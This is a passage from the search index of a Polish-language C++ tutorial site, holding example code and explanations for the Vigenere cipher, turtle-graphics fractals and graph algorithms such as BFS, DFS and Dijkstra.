0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/vigenere/","title":"Szyfr Vigenere'a","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/vigenere/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/vigenere/#szyfrowanie","title":"Szyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/vigenere/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring encode(string message, string key) {\n    string encoded = \"\";\n    int keyIndex = 0;\n    int encodedLetter;\n    int k;\n\n    for (char letter : message) {\n        k = key[keyIndex] - 'a';\n        encodedLetter = letter + k;\n\n        if (encodedLetter &gt; 'z') {\n            encodedLetter = encodedLetter - 'z' + 'a';\n        }\n\n        encoded += (char)encodedLetter;\n        keyIndex++;\n        keyIndex %= key.length();\n    }\n\n    return encoded;\n}\n\nint main() {\n    string message = \"computerscience\";\n    string key = \"cat\";\n\n    string encoded = encode(message, key);\n\n    cout &lt;&lt; encoded &lt;&lt; endl;\n\n    return 0;   \n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/cryptography/vigenere/#deszyfrowanie","title":"Deszyfrowanie","text":""},{"location":"programming/c%2B%2B/algorithms/cryptography/vigenere/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nstring decode(string message, string key) {\n    string decoded = \"\";\n    int keyIndex = 0;\n    int decodedLetter;\n    int k;\n\n    for (char letter : message) {\n        k = key[keyIndex] - 'a';\n        decodedLetter = letter - k;\n\n        if (decodedLetter &lt; 'a') {\n            decodedLetter = 'z' - ('a' - decodedLetter);\n        }\n\n        decoded += (char)decodedLetter;\n        keyIndex++;\n        keyIndex %= key.length();\n    }\n\n    return decoded;\n}\n\nint main() {\n    string message = \"eogrungrmeixpcx\";\n    string key = \"cat\";\n\n    string decoded = decode(message, key);\n\n    cout &lt;&lt; decoded &lt;&lt; endl;\n\n    return 0;   \n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/","title":"Fraktale","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/#wstep","title":"Wst\u0119p","text":"<p>W j\u0119zyku C++ nie ma wbudowanej biblioteki, kt\u00f3ra pozwoli\u0142aby na \"rysowanie \u017c\u00f3\u0142wiem\". Dlatego przedstawiamy w\u0142asn\u0105 implementacj\u0119 takiej biblioteki. Aby z niej skorzysta\u0107, wystarczy pobra\u0107 poni\u017cszy plik i do\u0142\u0105czy\u0107 go do swojego projektu.</p> <p>Turtle - biblioteka C++</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/binary-tree/","title":"Drzewo binarne","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/binary-tree/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/binary-tree/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid binaryTree(int rank, int length) {\n    turtle.forward(length);\n\n    if (rank &gt; 0) {\n        turtle.turnLeft(45);\n        binaryTree(rank - 1, length / 2);\n        turtle.turnRight(90);\n        binaryTree(rank - 1, length / 2);\n        turtle.turnLeft(45);\n    }\n\n    turtle.backward(length);\n}\n\nint main() {\n    turtle.penUp();\n    turtle.goTo(0, -SIZE / 2);\n    turtle.turnLeft(90);\n    turtle.penDown();\n\n    binaryTree(6, SIZE / 2);\n\n    turtle.saveBMP(\"drzewo_binarne.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/binary-tree/#link-do-implementacji","title":"Link do implementacji","text":"<p>Drzewo binarne</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/binary-tree/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>binaryTree</code> (linia 7) przyjmuje dwa argumenty: stopie\u0144 drzewa i pocz\u0105tkow\u0105 d\u0142ugo\u015b\u0107 ga\u0142\u0119zi (pnia). Na pocz\u0105tku przemieszczamy \u017c\u00f3\u0142wia do przodu o zadan\u0105 d\u0142ugo\u015b\u0107 (linia 8), rysuj\u0105c w ten spos\u00f3b ga\u0142\u0105\u017a. Nast\u0119pnie, je\u017celi stopie\u0144 jest wi\u0119kszy od zera (linia 10), to znaczy, \u017ce musimy narysowa\u0107 kolejne ga\u0142\u0119zie. W tym celu obracamy najpierw \u017c\u00f3\u0142wia w lewo o \\(45\\degree\\) (linia 11) i wywo\u0142aniem rekurencyjnym (linia 12) rysujemy ga\u0142\u0119zie. Podobnie post\u0119pujemy z drugim rozga\u0142\u0119zieniem. Najpierw musimy obr\u00f3ci\u0107 \u017c\u00f3\u0142wia w prawo o \\(90\\degree\\) (linia 13), czyli \\(2*45\\degree\\). Nast\u0119pnie stosujemy wywo\u0142anie rekurencyjne (linia 14), a potem obracamy \u017c\u00f3\u0142wia w lewo o \\(45\\degree\\) (linia 15), w ten spos\u00f3b wracaj\u0105c do pocz\u0105tkowego ustawienia.</p> <p>Na koniec, po ewentualnym narysowaniu rozga\u0142\u0119zie\u0144, cofamy \u017c\u00f3\u0142wia o zadan\u0105 d\u0142ugo\u015b\u0107 (linia 18), tym samym wracaj\u0105c do ustawienia z pocz\u0105tku wywo\u0142ania funkcji.</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/cantor-dust/","title":"Zbi\u00f3r Cantora","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/cantor-dust/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/cantor-dust/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid cantorDust(int rank, int length) {\n    if (rank &gt; 0) {\n        cantorDust(rank - 1, length / 3);\n        turtle.penUp();\n        turtle.forward(length / 3);\n        turtle.penDown();\n        cantorDust(rank - 1, length / 3);\n    } else {\n        turtle.forward(length);\n    }\n}\n\nvoid cantor(int rank, int length){\n    for (int i = 0; i &lt;= rank; i++) {\n        cantorDust(i, length);\n        turtle.penUp();\n        turtle.backward(length);\n        turtle.turnRight(90);\n        turtle.forward(20);\n        turtle.turnLeft(90);\n        turtle.penDown();\n    }\n}\n\nint main() {\n    turtle.penUp();\n    turtle.goTo(-SIZE / 2, 0);\n    turtle.penDown();\n\n    cantor(5, 729);\n\n    turtle.saveBMP(\"zbior_cantora.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/cantor-dust/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/CantorDust#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/dragon-curve/","title":"Smocza krzywa","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/dragon-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/dragon-curve/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid dragonCurve(int rank, int sign, int length) {\n    if (rank &gt; 0) {\n        turtle.turnLeft(45 * sign);\n        dragonCurve(rank - 1, 1, length);\n        turtle.turnRight(90 * sign * -1);\n        dragonCurve(rank - 1, -1, length);\n        turtle.turnLeft(45 * sign);\n    }\n    else {\n        turtle.forward(length);\n    }\n}\n\nint main() {\n    dragonCurve(12, 1, 5);\n\n    turtle.saveBMP(\"smocza_krzywa.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/dragon-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/DragonCurve#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/koch-curve/","title":"Krzywa Kocha","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/koch-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/koch-curve/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid kochCurve(int rank, int length){\n    if (rank &gt; 0) {\n        kochCurve(rank - 1, length);\n        turtle.turnLeft(60);\n        kochCurve(rank - 1, length);\n        turtle.turnRight(120);\n        kochCurve(rank - 1, length);\n        turtle.turnLeft(60);\n        kochCurve(rank - 1, length);\n    }\n    else {\n        turtle.forward(length);\n    }\n}\n\nint main() {\n    turtle.penUp();\n    turtle.goTo(-SIZE / 2, -SIZE / 2);\n    turtle.penDown();\n\n    kochCurve(6, 1);\n\n    turtle.saveBMP(\"krzywa_kocha.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/koch-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/KochCurve#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/koch-snowflake/","title":"P\u0142atek Kocha","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/koch-snowflake/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/koch-snowflake/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid kochCurve(int rank, int length) {\n    if (rank &gt; 0) {\n        kochCurve(rank - 1, length);\n        turtle.turnLeft(60);\n        kochCurve(rank - 1, length);\n        turtle.turnRight(120);\n        kochCurve(rank - 1, length);\n        turtle.turnLeft(60);\n        kochCurve(rank - 1, length);\n    }\n    else {\n        turtle.forward(length);\n    }\n}\n\nvoid kochSnowflake(int rank, int length) {\n    for(int i = 0; i &lt; 3; i++) {\n        kochCurve(rank, length);\n        turtle.turnRight(120);\n    }\n}\n\nint main() {\n    kochSnowflake(5, 1);\n\n    turtle.saveBMP(\"platek_kocha.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/koch-snowflake/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/KochSnowflake#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/minkowski-sausage/","title":"Minkowski Sausage","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/minkowski-sausage/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/minkowski-sausage/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid minkowskiCurve(int rank, int length) {\n    if (rank &gt; 0) {\n        turtle.turnRight(30);\n        minkowskiCurve(rank - 1, length / 2);\n        turtle.turnLeft(90);\n        minkowskiCurve(rank - 1, length / 2);\n        turtle.turnRight(90);\n        minkowskiCurve(rank - 1, length / 2);\n        turtle.turnLeft(30);\n    }\n    else {\n        turtle.forward(length);\n    }\n}\n\nvoid minkowskiSausage(int rank, int length) {\n    for(int i = 0; i &lt; 4; i++) {\n        minkowskiCurve(rank, length);\n        turtle.turnRight(90);\n    }\n}\n\nint main() {\n    minkowskiSausage(5, 200);\n\n    turtle.saveBMP(\"minkowski_sausage.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/minkowski-sausage/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/MinkowskiCurve#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/peano-curve/","title":"Krzywa Peano","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/peano-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/peano-curve/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid peanoCurve(int rank, int angle, int length) {\n    if (rank &gt; 0) {\n        turtle.turnRight(angle);\n        peanoCurve(rank - 1, -angle, length);\n        turtle.forward(length);\n        peanoCurve(rank - 1, angle, length);\n        turtle.forward(length);\n        peanoCurve(rank - 1, -angle, length);\n        turtle.turnLeft(angle);\n    }\n}\n\nint main() {\n    peanoCurve(5, 90, 10);\n\n    turtle.saveBMP(\"krzywa_peano.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/peano-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/PeanoCurve#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-square/","title":"Kwadrat Sierpi\u0144skiego","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-square/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-square/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid sierpinskiSquare(int rank, int length) {\n    if (rank == 0) {\n        turtle.beginFill();\n        for(int i = 0; i &lt; 4; i++) {\n            turtle.forward(length);\n            turtle.turnLeft(90);\n        }\n\n        turtle.endFill();\n        return;\n    }\n\n    for(int i = 0; i &lt; 4; i++) {\n        for(int j = 0; j &lt; 2; j++) {\n            turtle.forward(length / 3);\n            sierpinskiSquare(rank - 1, length / 3);\n        }\n\n        turtle.forward(length / 3);\n        turtle.turnLeft(90);\n    }\n}\n\nint main() {\n    turtle.penUp();\n    turtle.goTo(-SIZE / 2, -SIZE / 2);\n    turtle.penDown();\n\n    sierpinskiSquare(5, SIZE);\n\n    turtle.saveBMP(\"kwadrat_sierpinskiego.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-square/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/SierpinskiSquare#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-triangle/","title":"Tr\u00f3jk\u0105t Sierpi\u0144skiego","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-triangle/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-triangle/#implementacja","title":"Implementacja","text":"<pre><code>#include \"turtle.hpp\"\n\nconst int SIZE = 900;\n\nTurtle turtle(SIZE, SIZE);\n\nvoid sierpinskiTriangle(int rank, int length) {\n    if (rank == 0) {\n        turtle.beginFill();\n        for(int i = 0; i &lt; 3; i++) {\n            turtle.forward(length);\n            turtle.turnLeft(120);\n        }\n\n        turtle.endFill();\n        return;\n    }\n\n    for(int i = 0; i &lt; 3; i++) {\n        sierpinskiTriangle(rank - 1, length / 2);\n        turtle.forward(length);\n        turtle.turnLeft(120);\n    }\n}\n\nint main() {\n    turtle.penUp();\n    turtle.goTo(-SIZE / 2, -SIZE / 2);\n    turtle.penDown();\n\n    sierpinskiTriangle(6, SIZE);\n\n    turtle.saveBMP(\"trojkat_sierpinskiego.bmp\");\n\n    return 0;\n} \n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/fractals/sierpinski-triangle/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/SierpinskiTriangle#main.cpp</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/bfs/","title":"BFS","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/bfs/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/bfs/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;queue&gt;\n\nusing namespace std;\n\nvoid bfs(vector&lt;vector&lt;int&gt; &gt; &amp;graph, vector&lt;bool&gt; &amp;visited, int node) {\n    queue&lt;int&gt; nodes;\n\n    nodes.push(node);\n\n    while (!nodes.empty()) {\n        node = nodes.front();\n        nodes.pop();\n\n        if (visited[node]) {\n            continue;\n        }\n\n        visited[node] = true;\n\n        cout &lt;&lt; \"Visited node: \" &lt;&lt; node &lt;&lt; endl;\n\n        for (int i = 0; i &lt; graph[node].size(); i++) {\n            int nextNode = graph[node][i];\n            if (!visited[nextNode]) {\n                nodes.push(nextNode);\n            }\n        }\n    }\n}\n\nint main() {\n    vector&lt;vector&lt;int&gt; &gt; graph = {\n        {1 ,6}, \n        {0, 6, 3, 2},\n        {1, 3},\n        {2, 1, 6, 4, 5},\n        {3, 5},\n        {4, 3, 6},\n        {0, 1, 3, 5},\n    };\n\n    vector&lt;bool&gt; visited = vector&lt;bool&gt;(graph.size(), false);\n\n    bfs(graph, visited, 0);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/bfs/#opis-implementacji","title":"Opis implementacji","text":"<p>Na pocz\u0105tku przygotowujemy przyk\u0142adowy graf (linie 34-42) w formie listy s\u0105siedztwa zapisanej w dynamicznej tablicy typu <code>vector</code>. Przyk\u0142adowy graf (przedstawiony tak\u017ce na poni\u017cszym rysunku) ma 7 wierzcho\u0142k\u00f3w (numerowanych od zera) i jest nieskierowany.</p> <p>Po utworzeniu przyk\u0142adowego grafu przygotowujemy tablic\u0119 <code>visited</code> i pocz\u0105tkowo wype\u0142niamy j\u0105 warto\u015bciami <code>false</code> (linia 44). W tej tablicy zapami\u0119tujemy dla ka\u017cdego wierzcho\u0142ka, czy zosta\u0142 on ju\u017c odwiedzony, czy jeszcze nie. W tej implementacji korzystamy z dynamicznej tablicy typu <code>vector</code>, mo\u017cna jednak r\u00f3wnie dobrze wykorzysta\u0107 statyczn\u0105 tablic\u0119 (je\u017celi z g\u00f3ry znamy liczb\u0119 wierzcho\u0142k\u00f3w grafu).</p> <p>Funkcja <code>bfs</code> (linia 7) przyjmuje trzy parametry: graf, tablic\u0119 odwiedzonych wierzcho\u0142k\u00f3w oraz numer (identyfikator, indeks) pocz\u0105tkowego wierzcho\u0142ka, od kt\u00f3rego chcemy zacz\u0105\u0107 przeszukiwanie. Na pocz\u0105tku tworzymy kolejk\u0119 <code>nodes</code>, w kt\u00f3rej b\u0119dziemy przechowywali kolejne wierzcho\u0142ki do przetworzenia (linia 8). Pocz\u0105tkowo do kolejki dodajemy tylko pierwszy wierzcho\u0142ek, przekazany jako parametr funkcji (linia 10).</p> <p>Nast\u0119pnie przetwarzamy kolejne wierzcho\u0142ki z kolejki, tak d\u0142ugo jak w tej kolejce jest jeszcze co\u015b do przetworzenia (linia 12). W p\u0119tli pobieramy pierwszy wierzcho\u0142ek z kolejki (linia 13) i usuwamy go z kolejki (linia 14). Nast\u0119pnie sprawdzamy, czy zosta\u0142 ju\u017c wcze\u015bniej odwiedzony, odwo\u0142uj\u0105c si\u0119 do tablicy <code>visited</code> (linia 16). Je\u017celi wierzcho\u0142ek zosta\u0142 ju\u017c wcze\u015bniej odwiedzony, to nie chcemy go ponownie przetwarza\u0107, wi\u0119c przechodzimy do kolejnego obrotu p\u0119tli (linia 17).</p> <p>Je\u017celi wierzcho\u0142ek nie zosta\u0142 jeszcze odwiedzony, to oznaczamy go jako odwiedzony (linia 20) i wypisujemy jego numer (linia 22). Nast\u0119pnie przechodzimy przez wszystkich s\u0105siad\u00f3w aktualnie przetworzonego wierzcho\u0142ka (linia 24). W pomocniczej zmiennej <code>nextNode</code> zapami\u0119tujemy numer przetwarzanego s\u0105siada, pobranego z listy s\u0105siedztwa (linia 25). Nast\u0119pnie sprawdzamy, czy wierzcho\u0142ek ten by\u0142 ju\u017c odwiedzony (linia 26), a je\u017celi nie, to dodajemy go do kolejki (linia 27).</p> <p></p> <p>http://graphonline.ru/en/?graph=iyeQZmXVpPfZWqYG</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/connected-components/","title":"Sp\u00f3jne sk\u0142adowe","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/connected-components/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/connected-components/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nvoid dfs(vector&lt;vector&lt;int&gt; &gt; &amp;graph, vector&lt;bool&gt; &amp;visited, int node) {\n    if (visited[node]) {\n        return;\n    }\n\n    visited[node] = true;\n\n    for (int i = 0; i &lt; graph[node].size(); i++) {\n        int nextNode = graph[node][i];\n        if (!visited[nextNode]) {\n            dfs(graph, visited, nextNode);\n        }\n    }\n}\n\nint countConnectedComponents(vector&lt;vector&lt;int&gt; &gt; &amp;graph) {\n    int result = 0;\n    vector&lt;bool&gt; visited = vector&lt;bool&gt;(graph.size(), false);\n\n    for (int i = 0; i &lt; graph.size(); i++) {\n        if (!visited[i]) {\n            result++;\n            dfs(graph, visited, i);\n        }\n    }\n\n    return result;\n}\n\nint main() {\n    vector&lt;vector&lt;int&gt; &gt; graph = {\n        {1, 6}, \n        {0, 6, 3, 2},\n        {1, 3},\n        {2, 1, 6, 5},\n        {},\n        {3, 6},\n        {0, 1, 3, 5},\n    };\n\n    int connectedComponentsCount = countConnectedComponents(graph);\n\n    cout &lt;&lt; \"Number of connected components in the graph: \" &lt;&lt; connectedComponentsCount &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/connected-components/#opis-implementacji","title":"Opis implementacji","text":"<p>http://graphonline.ru/en/?graph=ntlitKWvBAKeDOgo</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/dfs/","title":"DFS","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/dfs/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/dfs/#implementacja-wersja-rekurencyjna","title":"Implementacja - wersja rekurencyjna","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nvoid dfs(vector&lt;vector&lt;int&gt; &gt; &amp;graph, vector&lt;bool&gt; &amp;visited, int node) {\n    if (visited[node]) {\n        return;\n    }\n\n    visited[node] = true;\n\n    cout &lt;&lt; \"Visited node: \" &lt;&lt; node &lt;&lt; endl;\n\n    for (int i = 0; i &lt; graph[node].size(); i++) {\n        int nextNode = graph[node][i];\n        if (!visited[nextNode]) {\n            dfs(graph, visited, nextNode);\n        }\n    }\n}\n\nint main() {\n    vector&lt;vector&lt;int&gt; &gt; graph = {\n        {1,6}, \n        {0, 6, 3, 2},\n        {1, 3},\n        {2, 1, 6, 4, 5},\n        {3, 5},\n        {4, 3, 6},\n        {0, 1, 3, 5},\n    };\n\n    vector&lt;bool&gt; visited = vector&lt;bool&gt;(graph.size(), false);\n\n    dfs(graph, visited, 0);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/dfs/#opis-implementacji","title":"Opis implementacji","text":"<p>Na pocz\u0105tku przygotowujemy przyk\u0142adowy graf (linie 24-32) w formie listy s\u0105siedztwa zapisanej w dynamicznej tablicy typu <code>vector</code>. Przyk\u0142adowy graf (przedstawiony tak\u017ce na poni\u017cszym rysunku) ma 7 wierzcho\u0142k\u00f3w (numerowanych od zera) i jest nieskierowany.</p> <p>Po utworzeniu przyk\u0142adowego grafu przygotowujemy tablic\u0119 <code>visited</code> i pocz\u0105tkowo wype\u0142niamy j\u0105 warto\u015bciami <code>false</code> (linia 34). W tej tablicy zapami\u0119tujemy dla ka\u017cdego wierzcho\u0142ka, czy zosta\u0142 on ju\u017c odwiedzony, czy jeszcze nie. W tej implementacji korzystamy z dynamicznej tablicy typu <code>vector</code>, mo\u017cna jednak r\u00f3wnie dobrze wykorzysta\u0107 statyczn\u0105 tablic\u0119 (je\u017celi z g\u00f3ry znamy liczb\u0119 wierzcho\u0142k\u00f3w grafu).</p> <p>Funkcja <code>dfs</code> (linia 6) jest funkcj\u0105 rekurencyjn\u0105, kt\u00f3ra przyjmuje trzy parametry: graf, tablic\u0119 odwiedzonych wierzcho\u0142k\u00f3w oraz numer (identyfikator, indeks) aktualnie odwiedzanego wierzcho\u0142ka. Na pocz\u0105tku sprawdzamy, czy obecny wierzcho\u0142ek zosta\u0142 ju\u017c odwiedzony (linia 7). Je\u017celi tak, to ko\u0144czymy dzia\u0142anie funkcji, nie chcemy ponownie przetwarza\u0107 ju\u017c odwiedzonego wierzcho\u0142ka. Je\u017celi wierzcho\u0142ek nie by\u0142 jeszcze odwiedzony, to oznaczamy go jako odwiedzonego (linia 11), wpisuj\u0105c warto\u015b\u0107 <code>true</code> do tablicy <code>visited</code> pod indeksem przetwarzanego wierzcho\u0142ka. Nast\u0119pnie wypisujemy numer aktualnie przetwarzanego wierzcho\u0142ka (linia 13).</p> <p>G\u0142\u00f3wn\u0105 cz\u0119\u015bci\u0105 funkcji <code>dfs</code> jest p\u0119tla przechodz\u0105ca przez wszystkich s\u0105siad\u00f3w aktualnie przetwarzanego wierzcho\u0142ka (linia 15). W pomocniczej zmiennej <code>nextNode</code> zapami\u0119tujemy numer przetwarzanego s\u0105siada, pobranego z listy s\u0105siedztwa (linia 16). Nast\u0119pnie sprawdzamy, czy wierzcho\u0142ek ten by\u0142 ju\u017c odwiedzony (linia 17), a je\u017celi nie, to odwiedzamy go rekurencyjnie wywo\u0142uj\u0105c funkcj\u0119 <code>dfs</code> z tym w\u0142a\u015bnie wierzcho\u0142kiem (linia 18).</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/dfs/#implementacja-wersja-iteracyjna","title":"Implementacja - wersja iteracyjna","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;stack&gt;\n\nusing namespace std;\n\nvoid dfs(vector&lt;vector&lt;int&gt; &gt; &amp;graph, vector&lt;bool&gt; &amp;visited, int node) {\n    stack&lt;int&gt; nodes;\n\n    nodes.push(node);\n\n    while (!nodes.empty()) {\n        node = nodes.top();\n        nodes.pop();\n\n        if (visited[node]) {\n            continue;\n        }\n\n        visited[node] = true;\n\n        cout &lt;&lt; \"Visited node: \" &lt;&lt; node &lt;&lt; endl;\n\n        for (int i = 0; i &lt; graph[node].size(); i++) {\n            int nextNode = graph[node][i];\n            if (!visited[nextNode]) {\n                nodes.push(nextNode);\n            }\n        }\n    }\n}\n\nint main() {\n    vector&lt;vector&lt;int&gt; &gt; graph = {\n        {1,6}, \n        {0, 6, 3, 2},\n        {1, 3},\n        {2, 1, 6, 4, 5},\n        {3, 5},\n        {4, 3, 6},\n        {0, 1, 3, 5},\n    };\n\n    vector&lt;bool&gt; visited = vector&lt;bool&gt;(graph.size(), false);\n\n    dfs(graph, visited, 0);\n\n    return 0;\n}\n</code></pre> <p>http://graphonline.ru/en/?graph=iyeQZmXVpPfZWqYG</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/dijkstra/","title":"Dijkstra","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/dijkstra/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/dijkstra/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;queue&gt;\n#include &lt;climits&gt;\n\nusing namespace std;\n\nstruct edge {\n    int from;\n    int to;\n    int distance;\n\n    edge(int from, int to, int distance) {\n        this-&gt;from = from;\n        this-&gt;to = to;\n        this-&gt;distance = distance;\n    }\n};\n\nvoid dijkstra(vector&lt;vector&lt;edge&gt; &gt; &amp;graph, vector&lt;int&gt; &amp;distances, int node) {\n    queue&lt;edge&gt; edges;\n\n    distances = vector&lt;int&gt;(graph.size(), INT_MAX);\n    distances[node] = 0;\n\n    for (int i = 0; i &lt; graph[node].size(); i++) {\n        edges.push(graph[node][i]);\n    }\n\n    while (!edges.empty()) {\n        edge current = edges.front();\n        edges.pop();\n\n        int newDistance = distances[current.from] + current.distance;\n\n        if (newDistance &gt;= distances[current.to]) {\n            continue;\n        }\n\n        distances[current.to] = newDistance;\n\n        for (int i = 0; i &lt; graph[current.to].size(); i++) {\n            edges.push(graph[current.to][i]);\n        }\n    }\n}\n\nint main() {\n    vector&lt;vector&lt;edge&gt; &gt; graph = {\n        {edge(0, 1, 5), edge(0, 6, 5)}, \n        {edge(1, 0, 5), edge(1, 6, 5), edge(1, 3, 3), edge(1, 2, 3)},\n        {edge(2, 1, 3), edge(2, 3, 1)},\n        {edge(3, 2, 1), edge(3, 1, 3), edge(3, 6, 3), edge(3, 4, 5), edge(3, 5, 4)},\n        {edge(4, 3, 5), edge(4, 5, 2)},\n        {edge(5, 4, 2), edge(5, 3, 4), edge(5, 6, 5)},\n        {edge(6, 0, 5), edge(6, 1, 5), edge(6, 3, 3), edge(6, 5, 5)},\n    };\n\n    vector&lt;int&gt; distances;\n\n    dijkstra(graph, distances, 0);\n\n    for(int dist : distances) {\n        cout &lt;&lt; dist &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/graphs/dijkstra/#opis-implementacji","title":"Opis implementacji","text":"<p>http://graphonline.ru/en/?graph=DZlFqSBPNgdHwNXK</p>"},{"location":"programming/c%2B%2B/algorithms/graphs/flood-fill/","title":"Flood Fill","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/flood-fill/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/graphs/flood-fill/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid floodFill(string image[], int row, int column, char symbol='*') {\n    if (image[row][column] != ' 